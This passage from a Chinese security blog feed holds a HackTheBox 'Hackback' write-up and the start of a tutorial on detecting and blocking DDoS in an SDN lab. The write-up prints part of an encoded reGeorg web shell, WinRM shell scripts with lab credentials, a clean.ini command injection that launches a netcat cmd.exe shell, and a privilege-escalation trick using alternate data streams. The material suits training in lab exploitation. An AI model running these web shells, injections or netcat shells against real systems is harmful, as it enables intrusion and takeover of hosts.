PSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK&quot;)); ?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/15/5d2b56b784c7f57856.png" alt="11.png"><br>编辑<code>/etc/proxychains.conf</code>的<code>socks4  127.0.0.1 6666</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/Desktop/reGeorg# python reGeorgSocksProxy.py -p 6666 -u http://admin.hackback.htb /2bb6916122f1da34dcd916421e531578/tunnel.aspx</span><br><span class="line">[INFO   ]  Log Level set to [INFO]</span><br><span class="line">[INFO   ]  Starting socks server [127.0.0.1:6666], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]</span><br><span class="line">[INFO   ]  Checking if Georg is ready</span><br><span class="line">[INFO   ]  Georg says, &apos;All seems fine&apos;</span><br></pre></td></tr></table></figure></p><p>这里使用<a href="https://github.com/Alamot/code-snippets/tree/master/winrm" target="_blank" rel="noopener">winrm</a>,值得注意的是ruby接口和库问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;winrm&apos;</span><br><span class="line"></span><br><span class="line"># Author: Alamot</span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  endpoint: &apos;http://10.10.10.128:5985/wsman&apos;,</span><br><span class="line">  transport: :ssl,</span><br><span class="line">  user: &apos;simple&apos;,</span><br><span class="line">  password: &apos;ZonoProprioZomaro:-(&apos;,</span><br><span class="line">  :no_ssl_peer_verification =&gt; true</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=&quot;&quot;</span><br><span class="line"></span><br><span class="line">conn.shell(:powershell) do |shell|</span><br><span class="line">    until command == &quot;exit\n&quot; do</span><br><span class="line">        output = shell.run(&quot;-join($id,&apos;PS &apos;,$(whoami),&apos;@&apos;,$env:computername,&apos; &apos;,$((gi $pwd).Name),&apos;&gt; &apos;)&quot;)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets        </span><br><span class="line">        output = shell.run(command) do |stdout, stderr|</span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        end</span><br><span class="line">    end    </span><br><span class="line">    puts &quot;Exiting with code #&#123;output.exitcode&#125;&quot;</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>等等登，ip变了(•́へ•́╬)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# sudo proxychains ruby winrm.rb</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:6666-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">PS hackback\simple@HACKBACK Documents&gt; whoami</span><br><span class="line">hackback\simple</span><br></pre></td></tr></table></figure></p><p>接着在<code>Desktop</code>发现信息。哦，但是这个用户下没有flag，代表游戏还得接着玩。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK Desktop&gt; ls</span><br><span class="line">-a----       11/30/2018   6:09 PM           1274 cmd.lnk</span><br></pre></td></tr></table></figure></p><p>在C:\ 下发现特殊的util目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK util&gt; dir -force</span><br><span class="line">d--h--       12/21/2018   6:21 AM                scripts</span><br></pre></td></tr></table></figure></p><p>出现隐藏目录<code>scripts</code><br>再次查询，出现大量脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK &gt; dir -force</span><br><span class="line">    Directory: C:\util\scripts</span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12/13/2018   2:54 PM                spool</span><br><span class="line">-a----       12/21/2018   5:44 AM             84 backup.bat</span><br><span class="line">-a----        7/16/2019  12:44 AM             39 batch.log</span><br><span class="line">-a----        7/15/2019   4:39 AM             46 clean.ini</span><br><span class="line">-a-h--       12/13/2018   2:58 PM            330 dellog.bat</span><br><span class="line">-a----        12/8/2018   9:17 AM           1232 dellog.ps1</span><br><span class="line">-a----        7/15/2019   4:39 AM             35 log.txt</span><br></pre></td></tr></table></figure></p><p>虽然没有权限阅读<code>dellog.bat</code>，但是发现<code>clean.ini</code>中调用了<code>log.txt</code>,那么将尝试写入shell，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime=100</span><br><span class="line">LogFile=c:\util\scripts\log.txt &amp; whoami #这里能附加命令</span><br><span class="line">Directory=c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在前面我们知道Windows为64位，上传64位nc,上传脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;winrm-fs&apos;</span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  endpoint: &apos;http://10.10.10.128:5985/wsman&apos;,</span><br><span class="line">  user: &apos;simple&apos;,</span><br><span class="line">  password: &apos;ZonoProprioZomaro:-(&apos;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">file_manager = WinRM::FS::FileManager.new(conn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class String</span><br><span class="line">  def tokenize</span><br><span class="line">    self.</span><br><span class="line">      split(/\s(?=(?:[^&apos;&quot;]|&apos;[^&apos;]*&apos;|&quot;[^&quot;]*&quot;)*$)/).</span><br><span class="line">      select &#123;|s| not s.empty? &#125;.</span><br><span class="line">      map &#123;|s| s.gsub(/(^ +)|( +$)|(^[&quot;&apos;]+)|([&quot;&apos;]+$)/,&apos;&apos;)&#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command=&quot;&quot;</span><br><span class="line"></span><br><span class="line">conn.shell(:powershell) do |shell|</span><br><span class="line">    until command == &quot;exit\n&quot; do</span><br><span class="line">        output = shell.run(&quot;-join($id,&apos;PS &apos;,$(whoami),&apos;@&apos;,$env:computername,&apos; &apos;,$((gi $pwd).Name),&apos;&gt; &apos;)&quot;)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets</span><br><span class="line">        if command.start_with?(&apos;UPLOAD&apos;) then</span><br><span class="line">            upload_command = command.tokenize</span><br><span class="line">            print(&quot;Uploading &quot; + upload_command[1] + &quot; to &quot; + upload_command[2])</span><br><span class="line">            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|</span><br><span class="line">                puts(&quot;#&#123;bytes_copied&#125; bytes of #&#123;total_bytes&#125; bytes copied&quot;)</span><br><span class="line">            end</span><br><span class="line">            command = &quot;echo `nOK`n&quot;</span><br><span class="line">        end</span><br><span class="line">        if command.start_with?(&apos;DOWNLOAD&apos;) then</span><br><span class="line">            download_command = command.tokenize</span><br><span class="line">            print(&quot;Downloading &quot; + download_command[1] + &quot; to &quot; + download_command[2])</span><br><span class="line">            file_manager.download(download_command[1], download_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|</span><br><span class="line">                puts(&quot;#&#123;bytes_copied&#125; bytes of #&#123;total_bytes&#125; bytes copied&quot;)</span><br><span class="line">            end</span><br><span class="line">            command = &quot;echo `nOK`n&quot;</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        output = shell.run(command) do |stdout, stderr|</span><br><span class="line">            STDOUT.print(stdout)</span><br><span class="line">            STDERR.print(stderr)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    puts(&quot;Exiting with code #&#123;output.exitcode&#125;&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD /root/Desktop/nc64.exe C:\windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure><p>稍稍修改一下,这里使用的<code>echo</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime=100</span><br><span class="line">LogFile=c:\util\scripts\log.txt &amp; c:\windows\system32\spool\drivers\color\nc64.exe 127.0.0.1 -lvp 10000 -e cmd.exe</span><br><span class="line">Directory=c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure></p><p>这里我要等一会，我等了半小时…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# proxychains nc 127.0.0.1 10000</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">hackback\hacker</span><br></pre></td></tr></table></figure></p><p>最后得到了一串字符串(<em>^▽^</em>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line">922449f8e******************</span><br></pre></td></tr></table></figure></p><p>但是游戏还是没有结束，任务是找到root.txt<br>前面找到的，可疑的服务<br><img src="https://i.loli.net/2019/07/16/5d2d44ed5f57d64524.png" alt="12.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Desktop&gt;sc query userlogger</span><br><span class="line">sc query userlogger</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 1077  (0x435)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">C:\Users\hacker\Desktop&gt;sc qc userlogger</span><br><span class="line">sc qc userlogger</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : c:\windows\system32\UserLogger.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : User Logger</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>第三天了<br>看看找到了什么<br>将<code>c:\windows\system32\UserLogger.exe</code>下载下来,使用IDE打开。<br>发现当SCM（服务控制管理器）使用参数（即日志文件的路径）启动服务时，服务会继续将日志文件的权限提升为”Everyone”。使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows\system32&gt;sc.exe start UserLogger &quot;c:\users\administrator\desktop\root.txt:&quot;</span><br><span class="line">&apos;:&apos;允许忽略或绕过`.log`自己附加或连接到路径，而是写入文件的备用数据流（ADS）</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; cat c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure><p>没有flag，只有一头驴<br>原因：进入<code>administrator</code>,发现没有自动继承权限<br>看看这篇帖子讲的<a href="https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1" target="_blank" rel="noopener">Microsoft（R）诊断中心标准收集器服务</a><br>最后基本确定在数据流中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator&gt; mkdir test</span><br><span class="line">PS C:\users\administrator\test&gt; copy c:\users\administrator\desktop\root.txt .</span><br><span class="line">PS C:\users\administrator\test&gt; Get-Item root.txt -Force -stream *</span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt::$DATA  </span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt::$DATA                                                                    </span><br><span class="line">PSDrive       : C                                                                                  </span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False                                                                              </span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : :$DATA                                                                             </span><br><span class="line">Length        : 1958                                                                               </span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:.log    </span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt:.log                                                                      </span><br><span class="line">PSDrive       : C                                                                                  </span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : .log</span><br><span class="line">Length        : 116</span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:flag.txt</span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt:flag.txt</span><br><span class="line">PSDrive       : C</span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : flag.txt</span><br><span class="line">Length        : 35</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator\test&gt; get-content root.txt -stream flag.txt</span><br><span class="line">6d29b069d4de8eed1a2fle**********</span><br></pre></td></tr></table></figure><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Hackback&quot;&gt;&lt;a href=&quot;#Hackback&quot; class=&quot;headerlink&quot; title=&quot;Hackback&quot;&gt;&lt;/a&gt;Hackback&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.128&lt;br&gt;kali：10.10.15.83&lt;br&gt;实验目的：找到flag&lt;br&gt;项目地址：&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/176&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackthebox.eu/home/machines/profile/176&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>DDoS攻击检测与防御</title>
    <link href="http://www.lanbainan.cn/2019/07/07/2019-07-07/"/>
    <id>http://www.lanbainan.cn/2019/07/07/2019-07-07/</id>
    <published>2019-07-07T08:44:00.000Z</published>
    <updated>2019-07-09T13:33:45.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本实验是基于SDN的DDoS检查与防御</p><blockquote><ul><li>Ubuntu</li><li>sFlow-R</li><li>Mininet</li><li>Floodlight (注意版本和jdk的问题)</li></ul></blockquote><p>其他问题不大<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>启动Floodlight<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd floodlight</span><br><span class="line">$ java -jar target/floodlight.jar</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/07/5d20c8232e40c86825.png" alt="2.png"><br><img src="https://i.loli.net/2019/07/07/5d20c81cb062172276.png" alt="3.png"><br>可以看见监听6653端口，8080是Floodight的Web端口<br><img src="https://i.loli.net/2019/07/07/5d20c675d07d384125.png" alt="1.png"></p><h2 id="mininet"><a href="#mininet" class="headerlink" title="mininet"></a>mininet</h2><p>Mininet是由一些虚拟的终端节点（end-hosts）、交换机、路由器连接而成的一个网络仿真器，它采用轻量级的虚拟化技术使得系统可以和真实网络相媲美。<br>Mininet可以很方便地创建一个支持SDN的网络：host就像真实的电脑一样工作，可以使用ssh登录，启动应用程序，程序可以向以太网端口发送数据包，数据包会被交换机、路由器接收并处理。有了这个网络，就可以灵活地为网络添加新的功能并进行相关测试，然后轻松部署到真实的硬件环境中。</p><h3 id="构建简单拓扑"><a href="#构建简单拓扑" class="headerlink" title="构建简单拓扑"></a>构建简单拓扑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mn --controller=remote,ip=127.0.0.1,port=6653 --topo=single,3</span><br><span class="line">mininet&gt;</span><br></pre></td></tr></table></figure><blockquote><p>mn：mininet命令简写<br>–controller=remote：使用远程的控制器<br>ip,port：控制器的ip和端口<br>–topo：指定拓扑类型，single 就是单一拓扑，就是最简单的交换机下面接主机，后面的3 表示，三台主机。</p></blockquote><hr><h3 id="mininet基本命令"><a href="#mininet基本命令" class="headerlink" title="mininet基本命令"></a>mininet基本命令</h3><blockquote><ul><li>nodes 指令显示节点信息</li><li>links指令显示链路信息</li><li>pingall检测网络链路连通性情况</li></ul></blockquote><p>floodlight提供图形界面<br><img src="https://i.loli.net/2019/07/07/5d2203898ddf180486.png" alt="4.png"></p><h1 id="DDOS检测"><a href="#DDOS检测" class="headerlink" title="DDOS检测"></a>DDOS检测</h1><h2 id="sFlow-RT"><a href="#sFlow-RT" class="headerlink" title="sFlow-RT"></a>sFlow-RT</h2><p>sFlow流量监控工具,可直观的展现网络中的流量以及其他监控信息。在SDN中有着很重要的作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd sflow-rt</span><br><span class="line">$ ./start.sh</span><br></pre></td></tr></table></figure></p><p>监听6343，Web界面8008<br><img src="https://i.loli.net/2019/07/07/5d22074fbf06410070.png" alt="5.png"></p><h3 id="配置sFlow-Agent"><a href="#配置sFlow-Agent" class="headerlink" title="配置sFlow Agent"></a>配置sFlow Agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ovs-vsctl -- --id=@sflow create sflow agent=eth0 \</span><br><span class="line">&gt; target=\&quot;127.0.0.1:6343\&quot; sampling=10 polling=20 -- -- set bridge s1 \</span><br><span class="line">&gt; sflow=@sflow</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/08/5d22cb0a720bf21468.png" alt="6.png"></p><blockquote><p>agent：监控 eth0 网卡产生的流量；<br>target：sFlow-RT的IP，默认端口6343；<br>bridge：需要开启sFlow的网桥；<br>sampling：采样率，表示每隔N个Packet就取样一次<br>polling：轮询时间，每隔N秒polling一次</p></blockquote><p>注：有N个网桥，就要部署 sFlowAgent </p><h3 id="检验sFlow-Agent"><a href="#检验sFlow-Agent" class="headerlink" title="检验sFlow Agent"></a>检验sFlow Agent</h3><p><img src="https://i.loli.net/2019/07/09/5d246ba0d0fc449379.png" alt="7.png"><br>在Flows的<code>Name</code>、<code>Keys</code>、<code>Value</code>，分别键入<code>flows</code>，<code>ipsource、ipdestination、stack</code>,<code>bytes</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mininet&gt; xterm h1 h2</span><br></pre></td></tr></table></figure></p><p>在Agents中找到<code>flows</code><br><img src="https://i.loli.net/2019/07/09/5d247086043c471767.png" alt="8.png"></p><h2 id="DDOS模拟"><a href="#DDOS模拟" class="headerlink" title="DDOS模拟"></a>DDOS模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mininet&gt; h2 ping -f h1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/09/5d2472675ec1655184.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure></p><p>CPU占有率飙升</p><h1 id="DDOS防御"><a href="#DDOS防御" class="headerlink" title="DDOS防御"></a>DDOS防御</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET  http://127.0.0.1:8080/wm/staticflowentrypusher/json</span><br><span class="line">&#123;&#125; #为空</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ vim DDOS.json</span><br><span class="line">&#123;</span><br><span class="line">### Drop所有数据</span><br><span class="line">&quot;switch&quot;: &quot;00:00: 00:00:00:00:00:01&quot;, #交换机DPID</span><br><span class="line">&quot;name&quot;: &quot;flow-test&quot; , #随便的名字</span><br><span class="line">&quot;cookie&quot;:&quot;0&quot;, # 流表规则标识</span><br><span class="line">&quot;in_port&quot;: &quot;1&quot;, 